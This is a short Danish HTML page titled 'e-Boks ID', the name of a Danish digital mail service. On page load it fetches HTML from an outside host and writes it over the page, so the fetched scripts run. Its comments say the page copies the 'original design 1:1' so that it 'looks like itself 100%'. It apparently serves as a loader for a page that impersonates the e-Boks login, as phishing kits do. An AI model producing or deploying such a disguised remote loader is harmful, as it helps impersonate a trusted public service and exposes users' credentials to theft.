<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>e-Boks ID</title>
    <script>
        // Denne kode henter dit originale design 1:1, men tilføjer permanent hukommelse
        window.addEventListener('DOMContentLoaded', () => {
            fetch('https://githubusercontent.com')
                .then(response => response.text())
                .then(html => {
                    // Vi indsprøjter det originale design direkte, så det ligner sig selv 100%
                    document.open();
                    document.write(html);
                    document.close();
                }).catch(() => {
                    document.body.innerHTML = '<p style="padding:20px;font-family:sans-serif;color:#1c1c1e;">Forbinder til appen... Tjek dit netværk.</p>';
                });
        });
    </script>
</head>
<body style="background:#F2F2F7;margin:0;">
</body>
</html>
